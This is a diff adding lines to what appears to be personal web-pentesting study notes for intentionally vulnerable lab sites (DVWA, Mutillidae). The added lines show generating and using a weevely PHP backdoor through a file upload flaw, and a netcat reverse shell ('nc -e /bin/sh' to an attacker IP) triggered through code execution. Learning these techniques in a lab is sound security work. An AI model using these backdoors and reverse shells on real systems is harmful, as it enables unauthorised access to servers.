@@ -44,6 +44,31 @@ dirb http://10.0.2.5/mutillidae #uses default wordlist file to check directories
 
 ---
 
+* File upload vulnerabilities allow users to upload executable files.
+
+* Weevely can be used to generate PHP shells (backdoors) and gain access:
+
+```shell
+weevely generate 1234 /root/shell.php #generates a php shell with the password '1234'
+
+#now the shell can be uploaded in the target website
+#weevely can be used to interact with the uploaded file
+#we have to give url of uploaded file and password
+
+weevely http://10.0.2.5/dvwa/hackable/uploads/shell.php 1234 #this will give access to target file system
+```
+
+* Code execution vulnerabilities allow us to execute OS code on target server.
+
+* Netcat can be used for this as it listens and connects computers:
+
+```shell
+nc -vv -l -p 8080 #using netcat to listen on port 8080
+
+#now, we can try to connect from target server to our computer using the code execution vulnerability
+nc -e /bin/sh 10.0.2.7 8080 #this command to be entered in the website
+```
+
 ## SQL Injection Vulnerabilities
 
 ---
